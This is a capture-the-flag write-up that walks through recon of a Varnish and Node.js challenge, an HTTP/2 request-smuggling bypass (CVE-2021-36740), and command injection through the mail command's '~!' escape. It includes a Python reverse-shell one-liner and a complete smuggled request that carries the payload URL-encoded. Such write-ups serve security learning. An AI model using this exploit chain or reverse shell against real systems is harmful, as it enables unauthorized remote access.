# Smuggling mail(423 pts) write up

# Recon
## Infomation Gathering
The challenge provided a gzip compressed tar file `smuggling-mail.tar.gz`.
We can find following files in the tarball.
```
smuggling-mail
├── challenge
│   ├── admin
│   │   ├── css
│   │   │   └── styles.css
│   │   ├── index.html
│   │   └── js
│   │       └── scripts.js
│   ├── flag.txt
│   ├── package.json
│   ├── public
│   │   ├── css
│   │   │   └── styles.css
│   │   ├── index.html
│   │   └── js
│   │       └── scripts.js
│   └── server.js
├── config
│   ├── entrypoint.sh
│   ├── hitch.conf
│   ├── supervisord.conf
│   └── varnish.vcl
├── Dockerfile
└── run.sh
```
Threre are several important info you can gather from these files.
- The service is using Varnish cache server with version 6.4.0 from Dockerfile file
- Varnish handles both h2, http/1.1 protocols based on the hitch.conf
- Varnish is checking the access to the endpoints which contains `/admin` string based on varnish.vcl
    - it is also check the http Authorization header matches `^Basic TOKEN$` pattern and TOKEN is randomized.
- There is only **four** real endpoints which are `/`, `/admin`, `/waitlist`, `/admin/alert` based on the server.js.
    - `/` and `/admin` only returns static files
    - `/waitlist` only return a string respond `Sorry, the waitlist is currently closed.`
    - only `/admin/alert` endpoint is interesting because executing a command called `mail`. The `mail` command takes anything client `POST` through the `msg` parameter

## Next Steps
First we check if there is exsits vulnerbilities for the varnish since we know the version is 6.4.0. There is one: **CVE-2021-36740**.
After reading https://labs.detectify.com/2021/08/26/how-to-set-up-docker-for-varnish-http-2-request-smuggling/, I found out I can bypass the varnish access checking using this vulnerbility.

The next thing is checking if there is anything wrong with the `mail` command so I can force it to read flag.txt and return it to me.

At the first glance of the google results, there is no noticeble vulnerbilities for this command.
However, I found out that the command `mail` can actually execute system command using `~!` which is similar to vim's syntax.
So this is all I need to get a reverse shell from the actual docker container.

# exploit(RCE)
Using the http request as the following:
    - the reverse shell one liner is url encoded. the original one linder is `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("THIS.IS.YOUR.IP",THEPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
    - There is a trailing `%0A`(line break) at the end of the payload otherwise the payload maynot work.
```
POST /waitlist HTTP/2
Host: 127.0.0.1:8080
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 1

a

POST /admin/alert HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 346

msg=~%21%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22THIS.IS.YOUR.IP%22%2CTHEPORT%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27%%0A
```
use Netcat to listen any port you want in your server which has a public **IP**
```
# cat flag.txt <--- this should give u the flag
flag{t35t_f14g_g035_h3r3} <---- this is not the real flag. Sorry forget to save it.
```
